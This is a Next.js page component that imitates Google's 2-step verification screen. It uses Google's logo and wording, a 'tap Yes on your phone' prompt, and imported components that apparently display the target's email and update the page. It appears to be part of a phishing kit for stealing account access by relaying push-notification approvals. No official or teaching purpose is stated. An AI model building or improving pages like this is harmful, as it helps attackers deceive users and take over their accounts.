import ShowcaseEmail from "@/components/ShowcaseEmail";
import Image from "next/image";
import React from "react";
import MobileAnimation from "@/public/image/mobile-animation.gif";
import UpdatePage from "@/components/UpdatePage";

export default function page() {
  return (
    <div className="w-screen p-5 text-black min-h-screen bg-white">
      <svg
        xmlns="https://www.w3.org/2000/svg"
        width="48"
        height="48"
        viewBox="0 0 48 48"
        aria-hidden="true"
        jsname="jjf7Ff"
      >
        <path
          fill="#4285F4"
          d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"
        ></path>
        <path
          fill="#34A853"
          d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"
        ></path>
        <path
          fill="#FBBC05"
          d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"
        ></path>
        <path
          fill="#EA4335"
          d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"
        ></path>
        <path fill="none" d="M2 2h44v44H2z"></path>
      </svg>
      <div>
        <h1 className="text-3xl py-3">2-step verification</h1>
        <p className="text-xl py-3">
          To help keep your account safe , Google Wants to make sure its really
          you trying to sign in{" "}
        </p>
        <div>
          <div className="inline-flex gap-3 items-center p-1  rounded-3xl border  ">
            <svg
              aria-hidden="true"
              fill="currentColor"
              focusable="false"
              width="38px"
              height="38px"
              viewBox="0 0 24 24"
              xmlns="https://www.w3.org/2000/svg"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
            </svg>

            <ShowcaseEmail />
            <UpdatePage />
            <svg
              aria-hidden="true"
              fill="currentColor"
              focusable="false"
              width="24px"
              height="24px"
              viewBox="0 0 24 24"
              xmlns="https://www.w3.org/2000/svg"
            >
              <path d="M7 10l5 5 5-5z"></path>
            </svg>
          </div>
        </div>

        <div>
          <Image src={MobileAnimation} width={300} height={300} alt="image" />
        </div>
      </div>
      <div>
        <h1 className="text-3xl py-3">check your phone </h1>
        <p>
          <div>
            Google sent a notification to your phone and Google. Tap{" "}
            <strong>Yes</strong> on the notification to verify it’s you.
            <div class="dMNVAe"></div>
          </div>
        </p>
      </div>
      <div className="flex gap-3 py-3 items-center">
        <input
          className="  form-checkbox h-5 w-5 appearance-none border-2   border-black bg-white checked:bg-blue-700 checked:border-blue-700"
          type="checkbox"
          name="check"
          id="check"
        />
        <label className="select-none" htmlFor="check">
          Don’t ask again on this device
        </label>
      </div>
      <div>
        <button className="text-blue-700 py-3 rounded-3xl">Resend it</button>
      </div>
      <div className="pt-3">
        <button className="text-blue-700 py-3 rounded-3xl">
          try another way
        </button>
      </div>

      <div className="flex w-full justify-between  bottom-2 left-0 items-center gap-3 p-5 ">
        <span className=" text-nowrap">English (United States) </span>
        <div className="flex gap-3">
          <span>Help</span>
          <span>Privacy</span>
          <span>Team</span>
        </div>
      </div>
    </div>
  );
}
